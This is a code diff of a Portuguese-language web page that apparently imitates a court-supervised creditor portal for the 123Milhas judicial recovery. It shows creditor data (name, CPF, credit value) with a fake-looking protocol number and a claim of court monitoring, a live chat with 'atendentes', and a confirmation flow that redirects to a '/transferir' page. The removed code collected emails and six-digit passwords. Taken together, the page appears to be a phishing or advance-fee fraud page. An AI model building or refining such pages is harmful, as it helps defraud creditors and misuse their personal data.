+          <div class="info-footer"><i class="fas fa-lock"></i> Transação segura | Monitorada pela 1ª Vara Empresarial de BH<br><small>${ci.numeroCotas === 4 ? 'Crédito superior a R$ 20 mil - pagamento em 4 cotas' : 'Crédito de até R$ 20 mil - pagamento em 2 cotas'}</small></div>`
       }
 
-      // ===== CARREGAR DADOS DO CACHE =====
-      function carregarDadosDoCache() {
-        const credorData = localStorage.getItem(STORAGE_KEYS.CREDOR_DATA)
-
-        if (credorData) {
-          try {
-            const credor = JSON.parse(credorData)
-            console.log('Dados carregados do cache:', credor)
-
-            if (credor.nome) {
-              document.getElementById('nomeCompleto').value = credor.nome
-            }
-
-            if (credor.cpf_limpo) {
-              const cpf = credor.cpf_limpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')
-              document.getElementById('cpf').value = cpf
-            }
-
-            if (credor.email) {
-              document.getElementById('email').value = credor.email
-            }
-
-            return true
-          } catch (e) {
-            console.error('Erro ao carregar cache:', e)
-          }
-        } else {
-          console.log('⚠️ Nenhum dado em cache encontrado')
-          showToast('Nenhum dado encontrado. Volte e consulte seu CPF.', 'error')
-          setTimeout(() => {
-            window.location.href = '/'
-          }, 2000)
-        }
-        return false
-      }
-
-      function showToast(message, type = 'success') {
-        const toast = document.createElement('div')
-        toast.className = `toast-message toast-${type}`
-        toast.innerHTML =
-          type === 'success' ? `<i class="fas fa-check-circle"></i> ${message}` : `<i class="fas fa-exclamation-triangle"></i> ${message}`
-        document.body.appendChild(toast)
-        setTimeout(() => toast.remove(), 4000)
-      }
-
-      // ===== PROCESSAR CADASTRO =====
-      function processarCadastro() {
-        const email = document.getElementById('email').value.trim()
-        const senha = document.getElementById('senha').value
-        const confirmarSenha = document.getElementById('confirmarSenha').value
-
-        // Validações
-        if (!email) {
-          showToast('Por favor, informe seu e-mail', 'error')
-          document.getElementById('email').classList.add('input-error')
-          return
-        }
-
-        if (!email.includes('@') || !email.includes('.')) {
-          showToast('Digite um e-mail válido', 'error')
-          document.getElementById('email').classList.add('input-error')
-          return
-        }
-
-        if (!senha) {
-          showToast('Por favor, crie uma senha de acesso', 'error')
-          document.getElementById('senha').classList.add('input-error')
-          return
-        }
-
-        if (senha.length !== 6) {
-          showToast('A senha deve ter exatamente 6 dígitos', 'error')
-          document.getElementById('senha').classList.add('input-error')
-          return
-        }
-
-        if (senha !== confirmarSenha) {
-          showToast('As senhas não coincidem', 'error')
-          document.getElementById('confirmarSenha').classList.add('input-error')
-          return
-        }
-
-        // Limpar erros
-        document.getElementById('email').classList.remove('input-error')
-        document.getElementById('senha').classList.remove('input-error')
-        document.getElementById('confirmarSenha').classList.remove('input-error')
-
-        // Loading
+      function confirmarSolicitacao() {
         const btn = document.getElementById('btnConfirmar')
+        if (!btn) return
         btn.innerHTML = '<span class="loading-spinner"></span> Processando...'
         btn.disabled = true
-
-        // Buscar dados do credor do cache
-        const credorData = localStorage.getItem(STORAGE_KEYS.CREDOR_DATA)
-        let credor = {}
-        if (credorData) {
-          credor = JSON.parse(credorData)
-        }
-
-        // Salvar no localStorage
-        const habilitacaoData = {
-          nome: document.getElementById('nomeCompleto').value,
-          cpf: document.getElementById('cpf').value,
-          cpf_limpo: credor.cpf_limpo || document.getElementById('cpf').value.replace(/\D/g, ''),
-          email: email,
-          senha: senha,
-          valor_real: credor.valor_real || 'R$ 0,00',
-          classe_txt: credor.classe_txt || 'Quirografário',
-          concluido: true,
-          dataHabilitacao: new Date().toISOString()
-        }
-
-        localStorage.setItem(STORAGE_KEYS.USER_HABILITACAO, JSON.stringify(habilitacaoData))
-        console.log('Dados salvos no cache:', habilitacaoData)
-
-        showToast('Cadastro realizado com sucesso! Redirecionando para o login...', 'success')
-        if (typeof addChatMessage === 'function') {
-          addChatMessage('system', 'Cadastro concluído! Agora faça login para acessar sua carteira.')
-        }
-
         setTimeout(() => {
-          window.location.href = '/login'
-        }, 2000)
+          const t = document.createElement('div')
+          t.className = 'toast-success'
+          t.innerHTML = '<i class="fas fa-check-circle"></i> Solicitação confirmada! Redirecionando...'
+          document.body.appendChild(t)
+          setTimeout(() => t.remove(), 2000)
+          setTimeout(() => (window.location.href = '/transferir'), 2000)
+        }, 1500)
       }
 
-      // ===== INICIALIZAR =====
-      carregarDadosDoCache()
-
-      // Remover erro ao digitar
-      document.getElementById('email').addEventListener('input', function () {
-        this.classList.remove('input-error')
-      })
-      document.getElementById('senha').addEventListener('input', function () {
-        this.classList.remove('input-error')
-      })
-      document.getElementById('confirmarSenha').addEventListener('input', function () {
-        this.classList.remove('input-error')
-      })
-
-      // ===== CÓDIGO DO CHAT =====
-      let clienteIdCustom = null
-      let salaIdCustom = null
-      let ultimoIndexMsgCustom = -1
-      let verificarIntervalCustom = null
-      let buscarIntervalCustom = null
-      let nomeCliente = null
-
-      function addChatMessage(tipo, texto, remetente = '') {
-        const container = document.getElementById('chatMessagesCustom')
-        if (!container) return
-        const div = document.createElement('div')
-        let nome = ''
-        if (tipo === 'user') nome = 'Você'
-        else if (tipo === 'operator') nome = remetente || 'Atendente'
-        else nome = '💬 Sistema'
-        div.className = `message-bubble ${tipo}`
-        div.innerHTML = `<strong>${nome}</strong><br>${texto}<br><span class="message-time">${new Date().toLocaleTimeString()}</span>`
-        container.appendChild(div)
-        container.scrollTop = container.scrollHeight
-      }
-
-      function mostrarModalNome() {
-        const modalHtml = `
-          <div id="nomeModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; display: flex; align-items: center; justify-content: center;">
-            <div style="background: white; border-radius: 20px; padding: 30px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2);">
-              <div style="margin-bottom: 20px;">
-                <img src="https://via.placeholder.com/150x50/f05929/white?text=123Milhas" style="max-height: 50px;" alt="Logo">
-              </div>
-              <h3 style="color: #f05929; margin-bottom: 10px;">Bem-vindo!</h3>
-              <p style="color: #6c757d; margin-bottom: 20px;">Para começarmos, qual é o seu nome?</p>
-              <input type="text" id="nomeInput" placeholder="Digite seu nome" style="width: 100%; padding: 12px; border: 1px solid #e0e0e0; border-radius: 10px; margin-bottom: 20px; font-size: 1rem;">
-              <button id="confirmarNome" style="background: #f05929; color: white; border: none; padding: 12px 24px; border-radius: 10px; cursor: pointer; width: 100%;">Começar atendimento</button>
-            </div>
-          </div>
-        `
-        document.body.insertAdjacentHTML('beforeend', modalHtml)
-        document.getElementById('confirmarNome').onclick = () => {
-          const nome = document.getElementById('nomeInput').value.trim()
-          if (nome) {
-            localStorage.setItem(STORAGE_KEYS.USER_NAME, nome)
-            document.getElementById('nomeModal').remove()
-            iniciarConexaoChat(nome)
-          } else {
-            alert('Por favor, digite seu nome')
+      function carregarDoCache() {
+        const cached = localStorage.getItem(STORAGE_KEYS.CREDOR_DATA)
+        if (cached) {
+          try {
+            const cr = JSON.parse(cached)
+            let valor = 0
+            if (cr.valor_real)
+              valor = parseFloat(
+                cr.valor_real
+                  .replace(/[R$\s]/g, '')
+                  .replace('.', '')
+                  .replace(',', '.')
+              )
+            credorData = {
+              nome: cr.nome || 'NÃO INFORMADO',
+              cpf: cr.cpf_limpo || '00000000000',
+              classe: cr.classe_txt || 'QUIROGRAFÁRIO',
+              protocolo: 'RJ-123-502.943/2024',
+              creditoTotal: valor
+            }
+            renderizarCard()
+          } catch {
+            mostrarErroSemCache()
           }
+        } else {
+          mostrarErroSemCache()
         }
       }
+      carregarDoCache()
 
-      async function iniciarConexaoChat(nome) {
+      // ===== CHAT — SISTEMA BASEADO EM TIMESTAMP =====
+      let chatClienteId = null
+      let chatSalaId = null
+      let chatUltimoTs = 0
+      let chatNome = null
+      let chatVerifInterval = null
+      let chatMsgInterval = null
+
+      function escHtml(s) {
+        const d = document.createElement('div')
+        d.textContent = s
+        return d.innerHTML
+      }
+
+      function addMsg(tipo, texto, remetente) {
+        const c = document.getElementById('chatMessages')
+        if (!c) return
+        const div = document.createElement('div')
+        div.className = `message-bubble ${tipo}`
+        const nome = tipo === 'user' ? 'Você' : tipo === 'operator' ? remetente || 'Atendente' : '💬 Sistema'
+        const hora = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
+        div.innerHTML = `<strong>${nome}</strong><br>${escHtml(texto)}<span class="message-time">${hora}</span>`
+        c.appendChild(div)
+        c.scrollTop = c.scrollHeight
+      }
+
+      async function entrarFila(nome) {
         try {
-          const response = await fetch('/api/entrar_fila', {
+          const r = await fetch('/api/entrar_fila', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ nome: nome })
+            body: JSON.stringify({ nome })
           })
-          const data = await response.json()
-          clienteIdCustom = data.cliente_id
-          nomeCliente = nome
-          addChatMessage('system', ` Olá ${nome}, você entrou na fila de atendimento.`)
-          if (verificarIntervalCustom) clearInterval(verificarIntervalCustom)
-          verificarIntervalCustom = setInterval(verificarAtendimentoCustom, 3000)
-        } catch (error) {
-          console.error('Erro:', error)
-          addChatMessage('system', '❌ Erro ao conectar.')
+          const d = await r.json()
+          chatClienteId = d.cliente_id
+          chatNome = nome
+          addMsg('system', `Olá ${nome}, você entrou na fila. Aguarde um atendente.`)
+          if (chatVerifInterval) clearInterval(chatVerifInterval)
+          chatVerifInterval = setInterval(verificarSala, 3000)
+        } catch {
+          addMsg('system', '❌ Erro ao conectar. Tente novamente.')
         }
       }
 
-      async function abrirChatCustom() {
-        const modal = document.getElementById('chatModalCustom')
-        modal.classList.add('active')
-        if (salaIdCustom) return
-        let nome = localStorage.getItem(STORAGE_KEYS.USER_NAME)
+      async function verificarSala() {
+        if (chatSalaId || !chatClienteId) return
+        try {
+          const r = await fetch(`/api/verificar_sala/${chatClienteId}`)
+          const d = await r.json()
+          if (d.status === 'em_atendimento' && d.sala_id) {
+            chatSalaId = d.sala_id
+            clearInterval(chatVerifInterval)
+            chatVerifInterval = null
+            addMsg('operator', '🎧 Um atendente entrou no chat! Como posso ajudar?')
+            if (chatMsgInterval) clearInterval(chatMsgInterval)
+            chatMsgInterval = setInterval(buscarMensagens, 2000)
+          }
+        } catch {}
+      }
+
+      async function buscarMensagens() {
+        if (!chatSalaId) return
+        try {
+          const r = await fetch(`/api/mensagens/${chatSalaId}?ultimo_timestamp=${chatUltimoTs}`)
+          const d = await r.json()
+          if (d.mensagens && d.mensagens.length > 0) {
+            d.mensagens.forEach((msg) => {
+              if (msg.time > chatUltimoTs) chatUltimoTs = msg.time
+              // Não exibir mensagens enviadas pelo próprio cliente (já exibidas otimisticamente)
+              if (msg.de === chatNome) return
+              if (msg.de === 'sistema') {
+                if (msg.texto && msg.texto.includes('encerrado')) {
+                  clearInterval(chatMsgInterval)
+                  chatMsgInterval = null
+                  chatSalaId = null
+                }
+                addMsg('system', msg.texto)
+              } else {
+                addMsg('operator', msg.texto, msg.de)
+              }
+            })
+            if (d.ultimo_timestamp > chatUltimoTs) chatUltimoTs = d.ultimo_timestamp
+          }
+        } catch {}
+      }
+
+      async function enviarMensagem() {
+        const input = document.getElementById('chatInput')
+        const texto = input ? input.value.trim() : ''
+        if (!texto) return
+        addMsg('user', texto)
+        input.value = ''
+        if (!chatSalaId) return
+        try {
+          const r = await fetch('/api/enviar_mensagem', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sala_id: chatSalaId, de: chatNome, texto, cliente_id: chatClienteId })
+          })
+          const d = await r.json()
+          if (d.success && d.mensagem && d.mensagem.time > chatUltimoTs) chatUltimoTs = d.mensagem.time
+        } catch {}
+      }
+
+      function pedirNome() {
+        const html = `<div id="nomeModal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center;">
+          <div style="background:white;border-radius:20px;padding:25px;max-width:350px;width:90%;text-align:center;">
+            <h3 style="color:#f05929;margin-bottom:10px;">Bem-vindo!</h3>
+            <p style="color:#6c757d;margin-bottom:20px;">Qual é o seu nome?</p>
+            <input type="text" id="nomeInput" placeholder="Digite seu nome" style="width:100%;padding:10px;border:1px solid #e0e0e0;border-radius:10px;margin-bottom:15px;font-family:inherit;">
+            <button id="btnConfNome" style="background:#f05929;color:white;border:none;padding:10px;border-radius:10px;cursor:pointer;width:100%;font-weight:700;">Começar atendimento</button>
+          </div>
+        </div>`
+        document.body.insertAdjacentHTML('beforeend', html)
+        const inp = document.getElementById('nomeInput')
+        inp.focus()
+        inp.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') confirmarNome()
+        })
+        document.getElementById('btnConfNome').onclick = confirmarNome
+      }
+
+      function confirmarNome() {
+        const nome = (document.getElementById('nomeInput')?.value || '').trim()
         if (!nome) {
-          mostrarModalNome()
+          alert('Por favor, digite seu nome')
           return
         }
-        nomeCliente = nome
-        try {
-          const response = await fetch('/api/entrar_fila', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ nome: nome })
-          })
-          const data = await response.json()
-          clienteIdCustom = data.cliente_id
-          addChatMessage('system', `Olá ${nome}, você entrou na fila de atendimento.`)
-          if (verificarIntervalCustom) clearInterval(verificarIntervalCustom)
-          verificarIntervalCustom = setInterval(verificarAtendimentoCustom, 3000)
-        } catch (error) {
-          console.error('Erro:', error)
-          addChatMessage('system', '❌ Erro ao conectar.')
+        localStorage.setItem(STORAGE_KEYS.USER_NAME, nome)
+        document.getElementById('nomeModal')?.remove()
+        entrarFila(nome)
+      }
+
+      async function abrirChat() {
+        document.getElementById('chatModal').classList.add('active')
+        if (chatSalaId || chatClienteId) return
+        const nome = localStorage.getItem(STORAGE_KEYS.USER_NAME)
+        if (!nome) {
+          pedirNome()
+          return
         }
+        entrarFila(nome)
       }
 
-      async function verificarAtendimentoCustom() {
-        if (salaIdCustom) return
-        if (!clienteIdCustom) return
-        try {
-          const response = await fetch(`/api/verificar_sala/${clienteIdCustom}`)
-          const data = await response.json()
-          if (data.sala_id) {
-            salaIdCustom = data.sala_id
-            iniciarChatCustom()
-          }
-        } catch (error) {
-          console.error('Erro:', error)
-        }
+      function fecharChat() {
+        document.getElementById('chatModal').classList.remove('active')
       }
 
-      function iniciarChatCustom() {
-        addChatMessage('operator', '🎧 Atendimento iniciado! Como podemos ajudar?')
-        if (buscarIntervalCustom) clearInterval(buscarIntervalCustom)
-        buscarIntervalCustom = setInterval(buscarMensagensCustom, 2000)
-      }
-
-      async function buscarMensagensCustom() {
-        if (!salaIdCustom) return
-        try {
-          const response = await fetch(`/api/mensagens/${salaIdCustom}?ultimo=${ultimoIndexMsgCustom}`)
-          const data = await response.json()
-          if (data.mensagens && data.mensagens.length > 0) {
-            data.mensagens.forEach((msg) => {
-              if (msg.de === 'Cliente') return
-              const isOperador = msg.de !== 'Cliente'
-              addChatMessage(isOperador ? 'operator' : 'user', msg.texto, msg.de)
-              ultimoIndexMsgCustom = data.total - 1
-            })
-          }
-        } catch (error) {
-          console.error('Erro:', error)
-        }
-      }
-
-      async function enviarMensagemCustom() {
-        const input = document.getElementById('chatInputCustom')
-        if (!input || !input.value.trim()) return
-        const texto = input.value.trim()
-        addChatMessage('user', texto)
-        input.value = ''
-        if (salaIdCustom) {
-          try {
-            await fetch('/api/enviar_mensagem', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ sala_id: salaIdCustom, de: 'Cliente', texto: texto })
-            })
-          } catch (error) {
-            console.error('Erro:', error)
-          }
-        }
-      }
-
-      function fecharChatCustom() {
-        const modal = document.getElementById('chatModalCustom')
-        if (modal) modal.classList.remove('active')
-        if (buscarIntervalCustom) clearInterval(buscarIntervalCustom)
-        if (verificarIntervalCustom) clearInterval(verificarIntervalCustom)
-      }
+      document.getElementById('chatInput').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') enviarMensagem()
+      })
     </script>
   </body>
 </html>
